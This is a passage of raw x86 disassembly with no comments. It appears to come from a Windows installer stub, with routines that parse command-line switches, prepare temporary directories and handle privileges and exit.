  403996:	8d 46 44             	lea    0x44(%esi),%eax
  403999:	83 e8 08             	sub    $0x8,%eax
  40399c:	01 30                	add    %esi,(%eax)
  40399e:	49                   	dec    %ecx
  40399f:	3b cb                	cmp    %ebx,%ecx
  4039a1:	75 f6                	jne    0x403999
  4039a3:	6a 01                	push   $0x1
  4039a5:	53                   	push   %ebx
  4039a6:	53                   	push   %ebx
  4039a7:	ff 75 f0             	push   -0x10(%ebp)
  4039aa:	e8 58 f8 ff ff       	call   0x403207
  4039af:	89 46 3c             	mov    %eax,0x3c(%esi)
  4039b2:	6a 40                	push   $0x40
  4039b4:	83 c6 04             	add    $0x4,%esi
  4039b7:	56                   	push   %esi
  4039b8:	68 a0 a5 42 00       	push   $0x42a5a0
  4039bd:	e8 55 27 00 00       	call   0x406117
  4039c2:	33 c0                	xor    %eax,%eax
  4039c4:	5e                   	pop    %esi
  4039c5:	5f                   	pop    %edi
  4039c6:	5b                   	pop    %ebx
  4039c7:	c9                   	leave
  4039c8:	c2 04 00             	ret    $0x4
  4039cb:	56                   	push   %esi
  4039cc:	be 00 78 43 00       	mov    $0x437800,%esi
  4039d1:	56                   	push   %esi
  4039d2:	e8 2d 2b 00 00       	call   0x406504
  4039d7:	56                   	push   %esi
  4039d8:	e8 52 26 00 00       	call   0x40602f
  4039dd:	85 c0                	test   %eax,%eax
  4039df:	75 02                	jne    0x4039e3
  4039e1:	5e                   	pop    %esi
  4039e2:	c3                   	ret
  4039e3:	56                   	push   %esi
  4039e4:	e8 cf 2d 00 00       	call   0x4067b8
  4039e9:	56                   	push   %esi
  4039ea:	e8 23 25 00 00       	call   0x405f12
  4039ef:	56                   	push   %esi
  4039f0:	68 00 70 43 00       	push   $0x437000
  4039f5:	e8 96 27 00 00       	call   0x406190
  4039fa:	5e                   	pop    %esi
  4039fb:	c3                   	ret
  4039fc:	a1 10 b0 40 00       	mov    0x40b010,%eax
  403a01:	83 f8 ff             	cmp    $0xffffffff,%eax
  403a04:	74 0e                	je     0x403a14
  403a06:	50                   	push   %eax
  403a07:	ff 15 1c 91 40 00    	call   *0x40911c
  403a0d:	83 0d 10 b0 40 00 ff 	orl    $0xffffffff,0x40b010
  403a14:	e8 a0 05 00 00       	call   0x403fb9
  403a19:	6a 07                	push   $0x7
  403a1b:	68 00 80 43 00       	push   $0x438000
  403a20:	e8 d8 32 00 00       	call   0x406cfd
  403a25:	c3                   	ret
  403a26:	81 ec f8 03 00 00    	sub    $0x3f8,%esp
  403a2c:	53                   	push   %ebx
  403a2d:	56                   	push   %esi
  403a2e:	57                   	push   %edi
  403a2f:	6a 20                	push   $0x20
  403a31:	5f                   	pop    %edi
  403a32:	33 db                	xor    %ebx,%ebx
  403a34:	68 01 80 00 00       	push   $0x8001
  403a39:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  403a3d:	c7 44 24 18 d8 95 40 	movl   $0x4095d8,0x18(%esp)
  403a44:	00 
  403a45:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  403a49:	ff 15 c0 90 40 00    	call   *0x4090c0
  403a4f:	8b 35 c4 90 40 00    	mov    0x4090c4,%esi
  403a55:	8d 44 24 34          	lea    0x34(%esp),%eax
  403a59:	50                   	push   %eax
  403a5a:	89 5c 24 4c          	mov    %ebx,0x4c(%esp)
  403a5e:	89 9c 24 4c 01 00 00 	mov    %ebx,0x14c(%esp)
  403a65:	89 9c 24 50 01 00 00 	mov    %ebx,0x150(%esp)
  403a6c:	c7 44 24 38 1c 01 00 	movl   $0x11c,0x38(%esp)
  403a73:	00 
  403a74:	ff d6                	call   *%esi
  403a76:	85 c0                	test   %eax,%eax
  403a78:	75 38                	jne    0x403ab2
  403a7a:	8d 44 24 34          	lea    0x34(%esp),%eax
  403a7e:	50                   	push   %eax
  403a7f:	c7 44 24 38 14 01 00 	movl   $0x114,0x38(%esp)
  403a86:	00 
  403a87:	ff d6                	call   *%esi
  403a89:	66 8b 44 24 48       	mov    0x48(%esp),%ax
  403a8e:	8b 4c 24 62          	mov    0x62(%esp),%ecx
  403a92:	66 2d 53 00          	sub    $0x53,%ax
  403a96:	83 c1 d0             	add    $0xffffffd0,%ecx
  403a99:	66 f7 d8             	neg    %ax
  403a9c:	c6 84 24 4e 01 00 00 	movb   $0x4,0x14e(%esp)
  403aa3:	04 
  403aa4:	1b c0                	sbb    %eax,%eax
  403aa6:	f7 d0                	not    %eax
  403aa8:	23 c1                	and    %ecx,%eax
  403aaa:	66 89 84 24 48 01 00 	mov    %ax,0x148(%esp)
  403ab1:	00 
  403ab2:	83 7c 24 38 0a       	cmpl   $0xa,0x38(%esp)
  403ab7:	73 08                	jae    0x403ac1
  403ab9:	81 64 24 40 ff ff 00 	andl   $0xffff,0x40(%esp)
  403ac0:	00 
  403ac1:	8b 44 24 40          	mov    0x40(%esp),%eax
  403ac5:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  403aca:	a3 78 a6 42 00       	mov    %eax,0x42a678
  403acf:	33 c0                	xor    %eax,%eax
  403ad1:	8a 64 24 38          	mov    0x38(%esp),%ah
  403ad5:	0f b7 c0             	movzwl %ax,%eax
  403ad8:	0b c1                	or     %ecx,%eax
  403ada:	33 c9                	xor    %ecx,%ecx
  403adc:	8a ac 24 48 01 00 00 	mov    0x148(%esp),%ch
  403ae3:	c1 e0 10             	shl    $0x10,%eax
  403ae6:	0f b7 c9             	movzwl %cx,%ecx
  403ae9:	0b c1                	or     %ecx,%eax
  403aeb:	0f b6 8c 24 4e 01 00 	movzbl 0x14e(%esp),%ecx
  403af2:	00 
  403af3:	0b c1                	or     %ecx,%eax
  403af5:	a3 7c a6 42 00       	mov    %eax,0x42a67c
  403afa:	66 81 3d 7e a6 42 00 	cmpw   $0x600,0x42a67e
  403b01:	00 06 
  403b03:	74 11                	je     0x403b16
  403b05:	53                   	push   %ebx
  403b06:	e8 3f 2b 00 00       	call   0x40664a
  403b0b:	3b c3                	cmp    %ebx,%eax
  403b0d:	74 07                	je     0x403b16
  403b0f:	68 00 0c 00 00       	push   $0xc00
  403b14:	ff d0                	call   *%eax
  403b16:	be 00 95 40 00       	mov    $0x409500,%esi
  403b1b:	56                   	push   %esi
  403b1c:	e8 b9 2a 00 00       	call   0x4065da
  403b21:	56                   	push   %esi
  403b22:	ff 15 48 91 40 00    	call   *0x409148
  403b28:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  403b2c:	38 1e                	cmp    %bl,(%esi)
  403b2e:	75 eb                	jne    0x403b1b
  403b30:	6a 0d                	push   $0xd
  403b32:	e8 13 2b 00 00       	call   0x40664a
  403b37:	6a 0b                	push   $0xb
  403b39:	e8 0c 2b 00 00       	call   0x40664a
  403b3e:	6a 09                	push   $0x9
  403b40:	a3 80 a5 42 00       	mov    %eax,0x42a580
  403b45:	e8 00 2b 00 00       	call   0x40664a
  403b4a:	3b c3                	cmp    %ebx,%eax
  403b4c:	74 0f                	je     0x403b5d
  403b4e:	6a 1e                	push   $0x1e
  403b50:	ff d0                	call   *%eax
  403b52:	85 c0                	test   %eax,%eax
  403b54:	74 07                	je     0x403b5d
  403b56:	80 0d 7c a6 42 00 80 	orb    $0x80,0x42a67c
  403b5d:	55                   	push   %ebp
  403b5e:	ff 15 38 90 40 00    	call   *0x409038
  403b64:	53                   	push   %ebx
  403b65:	ff 15 b8 92 40 00    	call   *0x4092b8
  403b6b:	53                   	push   %ebx
  403b6c:	68 b4 02 00 00       	push   $0x2b4
  403b71:	a3 80 a6 42 00       	mov    %eax,0x42a680
  403b76:	8d 84 24 5c 01 00 00 	lea    0x15c(%esp),%eax
  403b7d:	50                   	push   %eax
  403b7e:	53                   	push   %ebx
  403b7f:	68 d4 95 40 00       	push   $0x4095d4
  403b84:	ff 15 9c 91 40 00    	call   *0x40919c
  403b8a:	68 bc 95 40 00       	push   $0x4095bc
  403b8f:	68 80 95 42 00       	push   $0x429580
  403b94:	e8 2e 29 00 00       	call   0x4064c7
  403b99:	ff 15 8c 91 40 00    	call   *0x40918c
  403b9f:	50                   	push   %eax
  403ba0:	bd 00 50 43 00       	mov    $0x435000,%ebp
  403ba5:	55                   	push   %ebp
  403ba6:	e8 1c 29 00 00       	call   0x4064c7
  403bab:	6a 22                	push   $0x22
  403bad:	5e                   	pop    %esi
  403bae:	66 39 35 00 50 43 00 	cmp    %si,0x435000
  403bb5:	c7 05 88 a5 42 00 00 	movl   $0x400000,0x42a588
  403bbc:	00 40 00 
  403bbf:	8b c5                	mov    %ebp,%eax
  403bc1:	75 07                	jne    0x403bca
  403bc3:	8b fe                	mov    %esi,%edi
  403bc5:	b8 02 50 43 00       	mov    $0x435002,%eax
  403bca:	57                   	push   %edi
  403bcb:	50                   	push   %eax
  403bcc:	e8 3f 24 00 00       	call   0x406010
  403bd1:	50                   	push   %eax
  403bd2:	ff 15 28 92 40 00    	call   *0x409228
  403bd8:	89 44 24 14          	mov    %eax,0x14(%esp)
  403bdc:	e9 83 00 00 00       	jmp    0x403c64
  403be1:	6a 20                	push   $0x20
  403be3:	5f                   	pop    %edi
  403be4:	66 3b cf             	cmp    %di,%cx
  403be7:	75 07                	jne    0x403bf0
  403be9:	40                   	inc    %eax
  403bea:	40                   	inc    %eax
  403beb:	66 39 38             	cmp    %di,(%eax)
  403bee:	74 f9                	je     0x403be9
  403bf0:	66 39 30             	cmp    %si,(%eax)
  403bf3:	8b d7                	mov    %edi,%edx
  403bf5:	75 04                	jne    0x403bfb
  403bf7:	40                   	inc    %eax
  403bf8:	40                   	inc    %eax
  403bf9:	8b d6                	mov    %esi,%edx
  403bfb:	66 83 38 2f          	cmpw   $0x2f,(%eax)
  403bff:	75 55                	jne    0x403c56
  403c01:	40                   	inc    %eax
  403c02:	40                   	inc    %eax
  403c03:	66 83 38 53          	cmpw   $0x53,(%eax)
  403c07:	75 18                	jne    0x403c21
  403c09:	0f b7 48 02          	movzwl 0x2(%eax),%ecx
  403c0d:	66 3b cf             	cmp    %di,%cx
  403c10:	74 05                	je     0x403c17
  403c12:	66 3b cb             	cmp    %bx,%cx
  403c15:	75 0a                	jne    0x403c21
  403c17:	c7 05 60 a6 42 00 01 	movl   $0x1,0x42a660
  403c1e:	00 00 00 
  403c21:	81 38 4e 00 43 00    	cmpl   $0x43004e,(%eax)
  403c27:	75 1c                	jne    0x403c45
  403c29:	81 78 04 52 00 43 00 	cmpl   $0x430052,0x4(%eax)
  403c30:	75 13                	jne    0x403c45
  403c32:	0f b7 48 08          	movzwl 0x8(%eax),%ecx
  403c36:	66 3b cf             	cmp    %di,%cx
  403c39:	74 05                	je     0x403c40
  403c3b:	66 3b cb             	cmp    %bx,%cx
  403c3e:	75 05                	jne    0x403c45
  403c40:	83 4c 24 10 04       	orl    $0x4,0x10(%esp)
  403c45:	81 78 fc 20 00 2f 00 	cmpl   $0x2f0020,-0x4(%eax)
  403c4c:	75 08                	jne    0x403c56
  403c4e:	81 38 44 00 3d 00    	cmpl   $0x3d0044,(%eax)
  403c54:	74 1c                	je     0x403c72
  403c56:	52                   	push   %edx
  403c57:	50                   	push   %eax
  403c58:	e8 b3 23 00 00       	call   0x406010
  403c5d:	66 39 30             	cmp    %si,(%eax)
  403c60:	75 02                	jne    0x403c64
  403c62:	40                   	inc    %eax
  403c63:	40                   	inc    %eax
  403c64:	0f b7 08             	movzwl (%eax),%ecx
  403c67:	66 3b cb             	cmp    %bx,%cx
  403c6a:	0f 85 71 ff ff ff    	jne    0x403be1
  403c70:	eb 12                	jmp    0x403c84
  403c72:	66 89 58 fc          	mov    %bx,-0x4(%eax)
  403c76:	83 c0 04             	add    $0x4,%eax
  403c79:	50                   	push   %eax
  403c7a:	68 00 58 43 00       	push   $0x435800
  403c7f:	e8 43 28 00 00       	call   0x4064c7
  403c84:	8b 3d cc 90 40 00    	mov    0x4090cc,%edi
  403c8a:	be 00 78 43 00       	mov    $0x437800,%esi
  403c8f:	56                   	push   %esi
  403c90:	68 00 04 00 00       	push   $0x400
  403c95:	ff d7                	call   *%edi
  403c97:	e8 2f fd ff ff       	call   0x4039cb
  403c9c:	85 c0                	test   %eax,%eax
  403c9e:	75 56                	jne    0x403cf6
  403ca0:	68 fb 03 00 00       	push   $0x3fb
  403ca5:	56                   	push   %esi
  403ca6:	ff 15 d0 90 40 00    	call   *0x4090d0
  403cac:	68 b0 95 40 00       	push   $0x4095b0
  403cb1:	56                   	push   %esi
  403cb2:	e8 2c 28 00 00       	call   0x4064e3
  403cb7:	e8 0f fd ff ff       	call   0x4039cb
  403cbc:	85 c0                	test   %eax,%eax
  403cbe:	75 36                	jne    0x403cf6
  403cc0:	56                   	push   %esi
  403cc1:	68 fc 03 00 00       	push   $0x3fc
  403cc6:	ff d7                	call   *%edi
  403cc8:	68 a8 95 40 00       	push   $0x4095a8
  403ccd:	56                   	push   %esi
  403cce:	e8 10 28 00 00       	call   0x4064e3
  403cd3:	8b 3d d4 90 40 00    	mov    0x4090d4,%edi
  403cd9:	56                   	push   %esi
  403cda:	68 9c 95 40 00       	push   $0x40959c
  403cdf:	ff d7                	call   *%edi
  403ce1:	56                   	push   %esi
  403ce2:	68 94 95 40 00       	push   $0x409594
  403ce7:	ff d7                	call   *%edi
  403ce9:	e8 dd fc ff ff       	call   0x4039cb
  403cee:	85 c0                	test   %eax,%eax
  403cf0:	0f 84 6d 01 00 00    	je     0x403e63
  403cf6:	68 00 70 43 00       	push   $0x437000
  403cfb:	ff 15 64 91 40 00    	call   *0x409164
  403d01:	ff 74 24 10          	push   0x10(%esp)
  403d05:	e8 61 f9 ff ff       	call   0x40366b
  403d0a:	3b c3                	cmp    %ebx,%eax
  403d0c:	89 44 24 18          	mov    %eax,0x18(%esp)
  403d10:	0f 85 4d 01 00 00    	jne    0x403e63
  403d16:	39 1d e8 a5 42 00    	cmp    %ebx,0x42a5e8
  403d1c:	74 5c                	je     0x403d7a
  403d1e:	53                   	push   %ebx
  403d1f:	55                   	push   %ebp
  403d20:	e8 eb 22 00 00       	call   0x406010
  403d25:	8b f8                	mov    %eax,%edi
  403d27:	eb 13                	jmp    0x403d3c
  403d29:	81 3f 20 00 5f 00    	cmpl   $0x5f0020,(%edi)
  403d2f:	75 09                	jne    0x403d3a
  403d31:	81 7f 04 3f 00 3d 00 	cmpl   $0x3d003f,0x4(%edi)
  403d38:	74 06                	je     0x403d40
  403d3a:	4f                   	dec    %edi
  403d3b:	4f                   	dec    %edi
  403d3c:	3b fd                	cmp    %ebp,%edi
  403d3e:	73 e9                	jae    0x403d29
  403d40:	3b fd                	cmp    %ebp,%edi
  403d42:	c7 44 24 18 c8 94 40 	movl   $0x4094c8,0x18(%esp)
  403d49:	00 
  403d4a:	72 43                	jb     0x403d8f
  403d4c:	66 89 1f             	mov    %bx,(%edi)
  403d4f:	83 c7 08             	add    $0x8,%edi
  403d52:	57                   	push   %edi
  403d53:	e8 01 2b 00 00       	call   0x406859
  403d58:	85 c0                	test   %eax,%eax
  403d5a:	0f 84 03 01 00 00    	je     0x403e63
  403d60:	57                   	push   %edi
  403d61:	68 00 58 43 00       	push   $0x435800
  403d66:	e8 5c 27 00 00       	call   0x4064c7
  403d6b:	57                   	push   %edi
  403d6c:	68 00 60 43 00       	push   $0x436000
  403d71:	e8 51 27 00 00       	call   0x4064c7
  403d76:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  403d7a:	83 0d 6c a6 42 00 ff 	orl    $0xffffffff,0x42a66c
  403d81:	e8 5c 1e 00 00       	call   0x405be2
  403d86:	89 44 24 20          	mov    %eax,0x20(%esp)
  403d8a:	e9 d4 00 00 00       	jmp    0x403e63
  403d8f:	e8 c4 29 00 00       	call   0x406758
  403d94:	56                   	push   %esi
  403d95:	89 44 24 20          	mov    %eax,0x20(%esp)
  403d99:	e8 3f 27 00 00       	call   0x4064dd
  403d9e:	ff 74 24 14          	push   0x14(%esp)
  403da2:	8b f8                	mov    %eax,%edi
  403da4:	68 00 b0 42 00       	push   $0x42b000
  403da9:	e8 19 27 00 00       	call   0x4064c7
  403dae:	66 39 1d 00 58 43 00 	cmp    %bx,0x435800
  403db5:	75 0f                	jne    0x403dc6
  403db7:	68 00 68 43 00       	push   $0x436800
  403dbc:	68 00 58 43 00       	push   $0x435800
  403dc1:	e8 01 27 00 00       	call   0x4064c7
  403dc6:	8d 04 7d 00 78 43 00 	lea    0x437800(,%edi,2),%eax
  403dcd:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  403dd4:	00 
  403dd5:	89 44 24 24          	mov    %eax,0x24(%esp)
  403dd9:	bf 00 d8 42 00       	mov    $0x42d800,%edi
  403dde:	bb 00 e0 42 00       	mov    $0x42e000,%ebx
  403de3:	83 64 24 14 00       	andl   $0x0,0x14(%esp)
  403de8:	0f b7 6c 24 10       	movzwl 0x10(%esp),%ebp
  403ded:	55                   	push   %ebp
  403dee:	68 7c 95 40 00       	push   $0x40957c
  403df3:	ff 74 24 2c          	push   0x2c(%esp)
  403df7:	ff 15 4c 92 40 00    	call   *0x40924c
  403dfd:	a1 8c a5 42 00       	mov    0x42a58c,%eax
  403e02:	83 c4 0c             	add    $0xc,%esp
  403e05:	ff b0 20 01 00 00    	push   0x120(%eax)
  403e0b:	57                   	push   %edi
  403e0c:	e8 d0 2a 00 00       	call   0x4068e1
  403e11:	83 7c 24 1c 00       	cmpl   $0x0,0x1c(%esp)
  403e16:	56                   	push   %esi
  403e17:	74 07                	je     0x403e20
  403e19:	e8 9a 20 00 00       	call   0x405eb8
  403e1e:	eb 05                	jmp    0x403e25
  403e20:	e8 ed 20 00 00       	call   0x405f12
  403e25:	85 c0                	test   %eax,%eax
  403e27:	74 66                	je     0x403e8f
  403e29:	57                   	push   %edi
  403e2a:	ff 15 fc 90 40 00    	call   *0x4090fc
  403e30:	66 a9 00 04          	test   $0x400,%ax
  403e34:	75 1f                	jne    0x403e55
  403e36:	57                   	push   %edi
  403e37:	ff 15 64 91 40 00    	call   *0x409164
  403e3d:	85 c0                	test   %eax,%eax
  403e3f:	74 14                	je     0x403e55
  403e41:	6a 01                	push   $0x1
  403e43:	56                   	push   %esi
  403e44:	e8 b4 2e 00 00       	call   0x406cfd
  403e49:	8b 44 24 14          	mov    0x14(%esp),%eax
  403e4d:	ff 44 24 14          	incl   0x14(%esp)
  403e51:	85 c0                	test   %eax,%eax
  403e53:	74 98                	je     0x403ded
  403e55:	ff 44 24 10          	incl   0x10(%esp)
  403e59:	66 83 7c 24 10 00    	cmpw   $0x0,0x10(%esp)
  403e5f:	75 82                	jne    0x403de3
  403e61:	33 db                	xor    %ebx,%ebx
  403e63:	e8 94 fb ff ff       	call   0x4039fc
  403e68:	ff 15 b4 92 40 00    	call   *0x4092b4
  403e6e:	39 5c 24 18          	cmp    %ebx,0x18(%esp)
  403e72:	5d                   	pop    %ebp
  403e73:	0f 84 8a 00 00 00    	je     0x403f03
  403e79:	68 10 00 20 00       	push   $0x200010
  403e7e:	ff 74 24 18          	push   0x18(%esp)
  403e82:	e8 25 21 00 00       	call   0x405fac
  403e87:	6a 02                	push   $0x2
  403e89:	ff 15 d8 90 40 00    	call   *0x4090d8
  403e8f:	56                   	push   %esi
  403e90:	ff 15 00 91 40 00    	call   *0x409100
  403e96:	6a 00                	push   $0x0
  403e98:	56                   	push   %esi
  403e99:	e8 33 2e 00 00       	call   0x406cd1
  403e9e:	6a 01                	push   $0x1
  403ea0:	57                   	push   %edi
  403ea1:	68 00 88 43 00       	push   $0x438800
  403ea6:	ff 15 dc 90 40 00    	call   *0x4090dc
  403eac:	85 c0                	test   %eax,%eax
  403eae:	74 b1                	je     0x403e61
  403eb0:	6a 00                	push   $0x0
  403eb2:	57                   	push   %edi
  403eb3:	e8 19 2e 00 00       	call   0x406cd1
  403eb8:	a1 8c a5 42 00       	mov    0x42a58c,%eax
  403ebd:	ff b0 24 01 00 00    	push   0x124(%eax)
  403ec3:	53                   	push   %ebx
  403ec4:	e8 18 2a 00 00       	call   0x4068e1
  403ec9:	53                   	push   %ebx
  403eca:	e8 60 20 00 00       	call   0x405f2f
  403ecf:	85 c0                	test   %eax,%eax
  403ed1:	75 1f                	jne    0x403ef2
  403ed3:	8b 44 24 14          	mov    0x14(%esp),%eax
  403ed7:	ff 44 24 14          	incl   0x14(%esp)
  403edb:	85 c0                	test   %eax,%eax
  403edd:	75 82                	jne    0x403e61
  403edf:	57                   	push   %edi
  403ee0:	e8 ce 26 00 00       	call   0x4065b3
  403ee5:	85 c0                	test   %eax,%eax
  403ee7:	0f 84 00 ff ff ff    	je     0x403ded
  403eed:	e9 6f ff ff ff       	jmp    0x403e61
  403ef2:	50                   	push   %eax
  403ef3:	ff 15 1c 91 40 00    	call   *0x40911c
  403ef9:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  403efe:	e9 5e ff ff ff       	jmp    0x403e61
  403f03:	39 1d 54 a6 42 00    	cmp    %ebx,0x42a654
  403f09:	74 7c                	je     0x403f87
  403f0b:	8d 44 24 18          	lea    0x18(%esp),%eax
  403f0f:	50                   	push   %eax
  403f10:	6a 28                	push   $0x28
  403f12:	ff 15 e0 90 40 00    	call   *0x4090e0
  403f18:	50                   	push   %eax
  403f19:	ff 15 24 90 40 00    	call   *0x409024
  403f1f:	85 c0                	test   %eax,%eax
  403f21:	74 34                	je     0x403f57
  403f23:	8d 44 24 28          	lea    0x28(%esp),%eax
  403f27:	50                   	push   %eax
  403f28:	68 54 95 40 00       	push   $0x409554
  403f2d:	53                   	push   %ebx
  403f2e:	ff 15 20 90 40 00    	call   *0x409020
  403f34:	53                   	push   %ebx
  403f35:	53                   	push   %ebx
  403f36:	53                   	push   %ebx
  403f37:	8d 44 24 30          	lea    0x30(%esp),%eax
  403f3b:	50                   	push   %eax
  403f3c:	53                   	push   %ebx
  403f3d:	ff 74 24 2c          	push   0x2c(%esp)
  403f41:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  403f48:	00 
  403f49:	c7 44 24 48 02 00 00 	movl   $0x2,0x48(%esp)
  403f50:	00 
  403f51:	ff 15 1c 90 40 00    	call   *0x40901c
  403f57:	6a 05                	push   $0x5
  403f59:	e8 ec 26 00 00       	call   0x40664a
  403f5e:	3b c3                	cmp    %ebx,%eax
  403f60:	be 02 00 04 80       	mov    $0x80040002,%esi
  403f65:	74 0c                	je     0x403f73
  403f67:	56                   	push   %esi
  403f68:	6a 25                	push   $0x25
  403f6a:	53                   	push   %ebx
  403f6b:	53                   	push   %ebx
  403f6c:	53                   	push   %ebx
  403f6d:	ff d0                	call   *%eax
  403f6f:	85 c0                	test   %eax,%eax
  403f71:	74 0d                	je     0x403f80
  403f73:	56                   	push   %esi
  403f74:	6a 02                	push   $0x2
  403f76:	ff 15 2c 92 40 00    	call   *0x40922c
  403f7c:	85 c0                	test   %eax,%eax
  403f7e:	75 07                	jne    0x403f87
  403f80:	6a 09                	push   $0x9
  403f82:	e8 8a d4 ff ff       	call   0x401411
  403f87:	a1 6c a6 42 00       	mov    0x42a66c,%eax
  403f8c:	83 f8 ff             	cmp    $0xffffffff,%eax
  403f8f:	74 04                	je     0x403f95
  403f91:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403f95:	ff 74 24 1c          	push   0x1c(%esp)
  403f99:	e9 eb fe ff ff       	jmp    0x403e89
  403f9e:	56                   	push   %esi
  403f9f:	8b 35 dc 19 42 00    	mov    0x4219dc,%esi
  403fa5:	eb 0a                	jmp    0x403fb1
  403fa7:	ff 74 24 08          	push   0x8(%esp)
  403fab:	ff 56 04             	call   *0x4(%esi)
  403fae:	8b 36                	mov    (%esi),%esi
  403fb0:	59                   	pop    %ecx
  403fb1:	85 f6                	test   %esi,%esi
  403fb3:	75 f2                	jne    0x403fa7
  403fb5:	5e                   	pop    %esi
  403fb6:	c2 04 00             	ret    $0x4
  403fb9:	56                   	push   %esi
  403fba:	8b 35 dc 19 42 00    	mov    0x4219dc,%esi
  403fc0:	6a 00                	push   $0x0
  403fc2:	e8 d7 ff ff ff       	call   0x403f9e
  403fc7:	85 f6                	test   %esi,%esi
  403fc9:	74 1a                	je     0x403fe5
  403fcb:	57                   	push   %edi
  403fcc:	8b fe                	mov    %esi,%edi
  403fce:	ff 77 08             	push   0x8(%edi)
  403fd1:	8b 36                	mov    (%esi),%esi
  403fd3:	ff 15 3c 91 40 00    	call   *0x40913c
  403fd9:	57                   	push   %edi
  403fda:	ff 15 30 91 40 00    	call   *0x409130
  403fe0:	85 f6                	test   %esi,%esi
  403fe2:	75 e8                	jne    0x403fcc
  403fe4:	5f                   	pop    %edi
  403fe5:	83 25 dc 19 42 00 00 	andl   $0x0,0x4219dc
  403fec:	5e                   	pop    %esi
  403fed:	c3                   	ret
  403fee:	a1 dc 19 42 00       	mov    0x4219dc,%eax
  403ff3:	eb 0b                	jmp    0x404000
  403ff5:	8b 48 08             	mov    0x8(%eax),%ecx
  403ff8:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403ffc:	74 0a                	je     0x404008
  403ffe:	8b 00                	mov    (%eax),%eax
  404000:	85 c0                	test   %eax,%eax
  404002:	75 f1                	jne    0x403ff5
  404004:	40                   	inc    %eax
  404005:	c2 04 00             	ret    $0x4
  404008:	33 c0                	xor    %eax,%eax
  40400a:	eb f9                	jmp    0x404005
  40400c:	56                   	push   %esi
  40400d:	8b 74 24 08          	mov    0x8(%esp),%esi
  404011:	56                   	push   %esi
  404012:	e8 d7 ff ff ff       	call   0x403fee
  404017:	85 c0                	test   %eax,%eax
  404019:	75 03                	jne    0x40401e
  40401b:	40                   	inc    %eax
  40401c:	eb 2c                	jmp    0x40404a
  40401e:	6a 0c                	push   $0xc
  404020:	6a 40                	push   $0x40
  404022:	ff 15 2c 91 40 00    	call   *0x40912c
  404028:	85 c0                	test   %eax,%eax
  40402a:	74 1b                	je     0x404047
  40402c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  404030:	89 48 04             	mov    %ecx,0x4(%eax)
  404033:	8b 0d dc 19 42 00    	mov    0x4219dc,%ecx
  404039:	89 70 08             	mov    %esi,0x8(%eax)
  40403c:	89 08                	mov    %ecx,(%eax)
  40403e:	a3 dc 19 42 00       	mov    %eax,0x4219dc
  404043:	33 c0                	xor    %eax,%eax
  404045:	eb 03                	jmp    0x40404a
  404047:	83 c8 ff             	or     $0xffffffff,%eax
  40404a:	5e                   	pop    %esi
  40404b:	c2 08 00             	ret    $0x8
  40404e:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  404053:	75 06                	jne    0x40405b
  404055:	ff 05 54 95 42 00    	incl   0x429554
  40405b:	6a 00                	push   $0x0
  40405d:	ff 74 24 08          	push   0x8(%esp)
  404061:	68 08 04 00 00       	push   $0x408
  404066:	ff 35 84 a5 42 00    	push   0x42a584
  40406c:	ff 15 78 92 40 00    	call   *0x409278
  404072:	c2 04 00             	ret    $0x4
  404075:	ff 74 24 0c          	push   0xc(%esp)
  404079:	6a 00                	push   $0x0
  40407b:	e8 61 28 00 00       	call   0x4068e1
  404080:	50                   	push   %eax
  404081:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404085:	05 e8 03 00 00       	add    $0x3e8,%eax
  40408a:	50                   	push   %eax
  40408b:	ff 74 24 0c          	push   0xc(%esp)
  40408f:	e8 f6 1e 00 00       	call   0x405f8a
  404094:	c2 0c 00             	ret    $0xc
  404097:	83 3d 4c a6 42 00 00 	cmpl   $0x0,0x42a64c
  40409e:	a1 ec 19 42 00       	mov    0x4219ec,%eax
  4040a3:	75 05                	jne    0x4040aa
  4040a5:	a1 00 5a 42 00       	mov    0x425a00,%eax
  4040aa:	6a 01                	push   $0x1
  4040ac:	6a 01                	push   $0x1
  4040ae:	68 f4 00 00 00       	push   $0xf4
  4040b3:	50                   	push   %eax
  4040b4:	ff 15 78 92 40 00    	call   *0x409278
  4040ba:	c3                   	ret
  4040bb:	ff 74 24 04          	push   0x4(%esp)
  4040bf:	ff 35 00 5a 42 00    	push   0x425a00
  4040c5:	ff 15 70 92 40 00    	call   *0x409270
  4040cb:	c2 04 00             	ret    $0x4
  4040ce:	6a 01                	push   $0x1
  4040d0:	ff 74 24 08          	push   0x8(%esp)
  4040d4:	6a 28                	push   $0x28
  4040d6:	ff 35 84 a5 42 00    	push   0x42a584
  4040dc:	ff 15 78 92 40 00    	call   *0x409278
  4040e2:	c2 04 00             	ret    $0x4
  4040e5:	a1 48 95 42 00       	mov    0x429548,%eax
  4040ea:	85 c0                	test   %eax,%eax
  4040ec:	74 0f                	je     0x4040fd
  4040ee:	6a 00                	push   $0x0
  4040f0:	6a 00                	push   $0x0
  4040f2:	ff 74 24 0c          	push   0xc(%esp)
  4040f6:	50                   	push   %eax
  4040f7:	ff 15 78 92 40 00    	call   *0x409278
  4040fd:	c2 04 00             	ret    $0x4
  404100:	55                   	push   %ebp
  404101:	8b ec                	mov    %esp,%ebp
  404103:	83 ec 0c             	sub    $0xc,%esp
  404106:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  40410b:	83 f8 05             	cmp    $0x5,%eax
  40410e:	56                   	push   %esi
  40410f:	0f 87 b0 00 00 00    	ja     0x4041c5
  404115:	6a eb                	push   $0xffffffeb
  404117:	ff 75 0c             	push   0xc(%ebp)
  40411a:	ff 15 20 92 40 00    	call   *0x409220
  404120:	8b f0                	mov    %eax,%esi
  404122:	85 f6                	test   %esi,%esi
  404124:	0f 84 9b 00 00 00    	je     0x4041c5
  40412a:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  40412e:	0f 87 91 00 00 00    	ja     0x4041c5
  404134:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  404138:	0f 87 87 00 00 00    	ja     0x4041c5
  40413e:	8b 4e 14             	mov    0x14(%esi),%ecx
